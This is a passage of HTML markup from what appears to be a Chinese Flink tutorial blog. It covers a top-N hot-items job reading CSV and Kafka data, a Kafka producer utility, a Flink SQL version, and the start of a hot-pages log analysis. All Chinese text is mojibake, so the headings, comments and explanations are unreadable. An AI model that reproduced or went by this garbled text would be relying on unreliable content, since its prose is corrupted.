class="string">&quot;===============================&quot;</span>).append(System.lineSeparator());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// æ§åˆ¶è¾“å‡ºé¢‘ç‡</span></span><br><span class="line">      Thread.sleep(<span class="number">1000L</span>);</span><br><span class="line"></span><br><span class="line">      out.collect(resultBuilder.toString());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å…¥æ–‡ä»¶å¦‚ä¸‹ï¼š  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">543462,1715,1464116,pv,1511658000</span><br><span class="line">662867,2244074,1575622,pv,1511658000</span><br><span class="line">561558,3611281,965809,pv,1511658000</span><br><span class="line">894923,3076029,1879194,pv,1511658000</span><br><span class="line">834377,4541270,3738615,pv,1511658000</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡ºå¦‚ä¸‹ï¼š  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">============================</span><br><span class="line">çª—å£ç»“æŸæ—¶é—´ï¼š2017-11-26 10:10:00.0</span><br><span class="line">NO 1: å•†å“ID = 2338453 çƒ­é—¨åº¦ = 30</span><br><span class="line">NO 2: å•†å“ID = 812879 çƒ­é—¨åº¦ = 18</span><br><span class="line">NO 3: å•†å“ID = 2563440 çƒ­é—¨åº¦ = 14</span><br><span class="line">NO 4: å•†å“ID = 138964 çƒ­é—¨åº¦ = 12</span><br><span class="line">NO 5: å•†å“ID = 3244134 çƒ­é—¨åº¦ = 12</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">============================</span><br><span class="line">çª—å£ç»“æŸæ—¶é—´ï¼š2017-11-26 10:15:00.0</span><br><span class="line">NO 1: å•†å“ID = 2338453 çƒ­é—¨åº¦ = 33</span><br><span class="line">NO 2: å•†å“ID = 812879 çƒ­é—¨åº¦ = 18</span><br><span class="line">NO 3: å•†å“ID = 3244134 çƒ­é—¨åº¦ = 13</span><br><span class="line">NO 4: å•†å“ID = 2563440 çƒ­é—¨åº¦ = 13</span><br><span class="line">NO 5: å•†å“ID = 2364679 çƒ­é—¨åº¦ = 13</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">============================</span><br><span class="line">çª—å£ç»“æŸæ—¶é—´ï¼š2017-11-26 10:20:00.0</span><br><span class="line">NO 1: å•†å“ID = 2338453 çƒ­é—¨åº¦ = 32</span><br><span class="line">NO 2: å•†å“ID = 812879 çƒ­é—¨åº¦ = 18</span><br><span class="line">NO 3: å•†å“ID = 3244134 çƒ­é—¨åº¦ = 15</span><br><span class="line">NO 4: å•†å“ID = 4649427 çƒ­é—¨åº¦ = 13</span><br><span class="line">NO 5: å•†å“ID = 2364679 çƒ­é—¨åº¦ = 12</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 2-kafka"><a href="#ä»£ç 2-kafka" class="headerlink" title="ä»£ç 2-kafka"></a>ä»£ç 2-kafka</h6><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä»…ä¿®æ”¹ è·å–æ•°æ®æºçš„éƒ¨åˆ†</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. ä»csvæ–‡ä»¶ä¸­è·å–æ•°æ®</span></span><br><span class="line"><span class="comment">//        DataStream&lt;String&gt; inputStream = env.readTextFile(&quot;/tmp/UserBehaviorAnalysis/HotItemsAnalysis/src/main/resources/UserBehavior.csv&quot;);</span></span><br><span class="line"></span><br><span class="line">Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">properties.setProperty(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">properties.setProperty(<span class="string">&quot;group.id&quot;</span>, <span class="string">&quot;consumer&quot;</span>);</span><br><span class="line"><span class="comment">// ä¸‹é¢æ˜¯ä¸€äº›æ¬¡è¦å‚æ•°</span></span><br><span class="line">properties.setProperty(<span class="string">&quot;key.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">properties.setProperty(<span class="string">&quot;value.deserializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">properties.setProperty(<span class="string">&quot;auto.offset.reset&quot;</span>, <span class="string">&quot;latest&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. ä»kafkaæ¶ˆè´¹æ•°æ®</span></span><br><span class="line">DataStream&lt;String&gt; inputStream = env.addSource(<span class="keyword">new</span> FlinkKafkaConsumer&lt;&gt;(<span class="string">&quot;hotitems&quot;</span>, <span class="keyword">new</span> SimpleStringSchema(), properties ));</span><br></pre></td></tr></table></figure></li><li><p> å¯åŠ¨æœ¬åœ°kafkaé‡Œè‡ªå¸¦çš„zookeeper  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/zookeeper-server-start.sh config/zookeeper.properties</span></span><br></pre></td></tr></table></figure></li><li><p> å¯åŠ¨kafka  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-server-start.sh config/server.properties</span></span><br></pre></td></tr></table></figure></li><li><p> å¯åŠ¨kafkaç”Ÿäº§è€…console  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-console-producer.sh --broker-list localhost:9092  --topic hotitems</span></span><br></pre></td></tr></table></figure></li><li><p> è¿è¡ŒFlinkç¨‹åºï¼Œè¾“å…¥æ•°æ®ï¼ˆkafka-console-producerï¼‰  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> bin/kafka-console-producer.sh --broker-list localhost:9092  --topic hotitems</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">543462,1715,1464116,pv,1511658000</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">662867,2244074,1575622,pv,1511658060</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">561558,3611281,965809,pv,1511658120</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">894923,1715,1879194,pv,1511658180</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">834377,2244074,3738615,pv,1511658240</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">625915,3611281,570735,pv,1511658300</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">625915,3611281,570735,pv,1511658301</span></span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">============================</span><br><span class="line">çª—å£ç»“æŸæ—¶é—´ï¼š2017-11-26 09:05:00.0</span><br><span class="line">NO 1: å•†å“ID = 1715 çƒ­é—¨åº¦ = 2</span><br><span class="line">NO 2: å•†å“ID = 2244074 çƒ­é—¨åº¦ = 2</span><br><span class="line">NO 3: å•†å“ID = 3611281 çƒ­é—¨åº¦ = 1</span><br><span class="line">===============================</span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 3-kafkaæ‰¹é‡æ•°æ®æµ‹è¯•"><a href="#ä»£ç 3-kafkaæ‰¹é‡æ•°æ®æµ‹è¯•" class="headerlink" title="ä»£ç 3-kafkaæ‰¹é‡æ•°æ®æµ‹è¯•"></a>ä»£ç 3-kafkaæ‰¹é‡æ•°æ®æµ‹è¯•</h6><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.producer.KafkaProducer;</span><br><span class="line"><span class="keyword">import</span> org.apache.kafka.clients.producer.ProducerRecord;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/4 11:53 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">KafkaProducerUtil</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    writeToKafka(<span class="string">&quot;hotitems&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writeToKafka</span><span class="params">(String topic)</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="comment">// Kafkaé…ç½®</span></span><br><span class="line">    Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line">    properties.setProperty(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;localhost:9092&quot;</span>);</span><br><span class="line">    properties.setProperty(<span class="string">&quot;key.serializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">    properties.setProperty(<span class="string">&quot;value.serializer&quot;</span>, <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰ä¸€ä¸ªKafka Producer</span></span><br><span class="line">    KafkaProducer&lt;String, String&gt; kafkaProducer = <span class="keyword">new</span> KafkaProducer&lt;String, String&gt;(properties);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç”¨ç¼“å†²æ–¹å¼æ¥è¯»å–æ–‡æœ¬</span></span><br><span class="line">    BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(<span class="string">&quot;/tmp/UserBehaviorAnalysis/HotItemsAnalysis/src/main/resources/UserBehavior.csv&quot;</span>));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span>((line = bufferedReader.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line">      ProducerRecord&lt;String,String&gt; producerRecord = <span class="keyword">new</span> ProducerRecord&lt;&gt;(topic,line );</span><br><span class="line">      <span class="comment">// ç”¨producerå‘é€æ•°æ®</span></span><br><span class="line">      kafkaProducer.send(producerRecord);</span><br><span class="line">    &#125;</span><br><span class="line">    kafkaProducer.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> å¯åŠ¨zookeeper </p></li><li><p> å¯åŠ¨kafkaæœåŠ¡ </p></li><li><p> è¿è¡Œè¯¥javaç¨‹åºï¼Œä¹‹åå°±å¯ä»¥ç›´æ¥å¯åŠ¨HotItemsç¨‹åºï¼Œè¯»å–æœ¬åœ°å·²æœ‰çš„kafkaæ•°æ®äº† </p></li></ul><h6 id="ä»£ç 4-Flink-SQLå®ç°"><a href="#ä»£ç 4-Flink-SQLå®ç°" class="headerlink" title="ä»£ç 4-Flink-SQLå®ç°"></a>ä»£ç 4-Flink-SQLå®ç°</h6><ul><li> javaä»£ç </li></ul><p><strong>ä¸‹é¢ç”¨æœ€æ–°çš„Expressionå†™æ³•å®ç°&lt;=æ–°ç‰ˆæœ¬æ¨èçš„å†™æ³•</strong>  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.UserBehavior;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.EnvironmentSettings;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Slide;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.apache.flink.table.api.Expressions.$;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.apache.flink.table.api.Expressions.lit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 12:18 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HotItemsWithSql</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 1. åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. ä»csvæ–‡ä»¶ä¸­è·å–æ•°æ®</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/UserBehaviorAnalysis/HotItemsAnalysis/src/main/resources/UserBehavior.csv&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. è½¬æ¢æˆPOJO,åˆ†é…æ—¶é—´æˆ³å’Œwatermark</span></span><br><span class="line">    DataStream&lt;UserBehavior&gt; userBehaviorDataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> UserBehavior(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Integer(fields[<span class="number">2</span>]), fields[<span class="number">3</span>], <span class="keyword">new</span> Long(fields[<span class="number">4</span>]));</span><br><span class="line">    &#125;).assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">      <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;UserBehavior&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(UserBehavior element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. åˆ›å»ºè¡¨æ‰§è¡Œç¯å¢ƒ,ä½¿ç”¨blinkç‰ˆæœ¬</span></span><br><span class="line">    EnvironmentSettings settings = EnvironmentSettings.newInstance()</span><br><span class="line">      .useBlinkPlanner()</span><br><span class="line">      .inStreamingMode()</span><br><span class="line">      .build();</span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env, settings);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. å°†æµè½¬æ¢æˆè¡¨</span></span><br><span class="line">    Table dataTable = tableEnv.fromDataStream(userBehaviorDataStream,</span><br><span class="line">                                              $(<span class="string">&quot;itemId&quot;</span>),</span><br><span class="line">                                              $(<span class="string">&quot;behavior&quot;</span>),</span><br><span class="line">                                              $(<span class="string">&quot;timestamp&quot;</span>).rowtime().as(<span class="string">&quot;ts&quot;</span>)</span><br><span class="line">                                             );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. åˆ†ç»„å¼€çª—</span></span><br><span class="line">    <span class="comment">// Table API</span></span><br><span class="line">    Table windowAggTable = dataTable</span><br><span class="line">      .filter($(<span class="string">&quot;behavior&quot;</span>).isEqual(<span class="string">&quot;pv&quot;</span>))</span><br><span class="line">      .window(Slide.over(lit(<span class="number">1</span>).hours()).every(lit(<span class="number">5</span>).minutes()).on($(<span class="string">&quot;ts&quot;</span>)).as(<span class="string">&quot;w&quot;</span>))</span><br><span class="line">      .groupBy($(<span class="string">&quot;itemId&quot;</span>), $(<span class="string">&quot;w&quot;</span>))</span><br><span class="line">      .select($(<span class="string">&quot;itemId&quot;</span>), $(<span class="string">&quot;w&quot;</span>).end().as(<span class="string">&quot;windowEnd&quot;</span>), $(<span class="string">&quot;itemId&quot;</span>).count().as(<span class="string">&quot;cnt&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. åˆ©ç”¨å¼€åˆ›å‡½æ•°ï¼Œå¯¹countå€¼è¿›è¡Œæ’åºï¼Œå¹¶è·å–Row numberï¼Œå¾—åˆ°Top N</span></span><br><span class="line">    <span class="comment">// SQL</span></span><br><span class="line">    DataStream&lt;Row&gt; aggStream = tableEnv.toAppendStream(windowAggTable, Row.class);</span><br><span class="line">    tableEnv.createTemporaryView(<span class="string">&quot;agg&quot;</span>, aggStream, $(<span class="string">&quot;itemId&quot;</span>), $(<span class="string">&quot;windowEnd&quot;</span>), $(<span class="string">&quot;cnt&quot;</span>));</span><br><span class="line"></span><br><span class="line">    Table resultTable = tableEnv.sqlQuery(<span class="string">&quot;select * from &quot;</span> +</span><br><span class="line">                                          <span class="string">&quot;  ( select *, ROW_NUMBER() over (partition by windowEnd order by cnt desc) as row_num &quot;</span> +</span><br><span class="line">                                          <span class="string">&quot;  from agg) &quot;</span> +</span><br><span class="line">                                          <span class="string">&quot; where row_num &lt;= 5 &quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// çº¯SQLå®ç°</span></span><br><span class="line">    tableEnv.createTemporaryView(<span class="string">&quot;data_table&quot;</span>, userBehaviorDataStream, $(<span class="string">&quot;itemId&quot;</span>), $(<span class="string">&quot;behavior&quot;</span>), $(<span class="string">&quot;timestamp&quot;</span>).rowtime().as(<span class="string">&quot;ts&quot;</span>));</span><br><span class="line">    Table resultSqlTable = tableEnv.sqlQuery(<span class="string">&quot;select * from &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot;  ( select *, ROW_NUMBER() over (partition by windowEnd order by cnt desc) as row_num &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot;  from ( &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot;    select itemId, count(itemId) as cnt, HOP_END(ts, interval &#x27;5&#x27; minute, interval &#x27;1&#x27; hour) as windowEnd &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot;    from data_table &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot;    where behavior = &#x27;pv&#x27; &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot;    group by itemId, HOP(ts, interval &#x27;5&#x27; minute, interval &#x27;1&#x27; hour)&quot;</span> +</span><br><span class="line">                                             <span class="string">&quot;    )&quot;</span> +</span><br><span class="line">                                             <span class="string">&quot;  ) &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot; where row_num &lt;= 5 &quot;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//   tableEnv.toRetractStream(resultTable, Row.class).print();</span></span><br><span class="line">    tableEnv.toRetractStream(resultSqlTable, Row.class).print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;hot items with sql job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li> è¾“å‡º  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">(true,2288408,2017-11-26T03:00,15,4)</span><br><span class="line">(false,279675,2017-11-26T03:00,14,5)</span><br><span class="line">(true,291932,2017-11-26T03:00,15,5)</span><br><span class="line">(false,3715112,6,2017-11-26T03:05,1)</span><br><span class="line">(true,3244931,7,2017-11-26T03:05,1)</span><br><span class="line">(false,710777,6,2017-11-26T03:05,2)</span><br><span class="line">(true,3715112,6,2017-11-26T03:05,2)</span><br><span class="line">(false,724262,6,2017-11-26T03:05,3)</span><br><span class="line">(true,710777,6,2017-11-26T03:05,3)</span><br><span class="line">(false,1303734,5,2017-11-26T03:05,4)</span><br><span class="line">(true,724262,6,2017-11-26T03:05,4)</span><br><span class="line">(false,4622270,5,2017-11-26T03:05,5)</span><br><span class="line">(true,1303734,5,2017-11-26T03:05,5)</span><br><span class="line">(false,1303734,5,2017-11-26T03:05,5)</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li></ul><h5 id="å®æ—¶æµé‡ç»Ÿè®¡â€”â€”çƒ­é—¨é¡µé¢"><a href="#å®æ—¶æµé‡ç»Ÿè®¡â€”â€”çƒ­é—¨é¡µé¢" class="headerlink" title="å®æ—¶æµé‡ç»Ÿè®¡â€”â€”çƒ­é—¨é¡µé¢"></a>å®æ—¶æµé‡ç»Ÿè®¡â€”â€”çƒ­é—¨é¡µé¢</h5><ul><li>åŸºæœ¬éœ€æ±‚ <ul><li>ä»webæœåŠ¡å™¨çš„æ—¥å¿—ä¸­ï¼Œç»Ÿè®¡å®æ—¶çš„çƒ­é—¨è®¿é—®é¡µé¢</li><li>ç»Ÿè®¡æ¯åˆ†é’Ÿçš„ipè®¿é—®é‡ï¼Œå–å‡ºè®¿é—®é‡æœ€å¤§çš„5ä¸ªåœ°å€ï¼Œæ¯5ç§’æ›´æ–°ä¸€æ¬¡</li></ul></li><li>è§£å†³æ€è·¯1 <ul><li>å°†apacheæœåŠ¡å™¨æ—¥å¿—ä¸­çš„æ—¶é—´ï¼Œè½¬æ¢ä¸ºæ—¶é—´æˆ³ï¼Œä½œä¸ºEvent Time</li><li>æ„å»ºæ»‘åŠ¨çª—å£ï¼Œçª—å£é•¿åº¦ä¸º1åˆ†é’Ÿï¼Œæ»‘åŠ¨è·ç¦»ä¸º5ç§’</li></ul></li></ul><h6 id="POJO-1"><a href="#POJO-1" class="headerlink" title="POJO"></a>POJO</h6><ul><li><p> ApacheLogEvent  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String ip;</span><br><span class="line"><span class="keyword">private</span> String userId;</span><br><span class="line"><span class="keyword">private</span> Long timestamp;</span><br><span class="line"><span class="keyword">private</span> String method;</span><br><span class="line"><span class="keyword">private</span> String url;</span><br></pre></td></tr></table></figure></li><li><p> PageViewCount  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String url;</span><br><span class="line"><span class="keyword">private</span> Long windowEnd;</span><br><span class="line"><span class="keyword">private</span> Long count;</span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 1-æ–‡ä»¶-1"><a href="#ä»£ç 1-æ–‡ä»¶-1" class="headerlink" title="ä»£ç 1-æ–‡ä»¶"></a>ä»£ç 1-æ–‡ä»¶</h6><ul><li><p> Javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 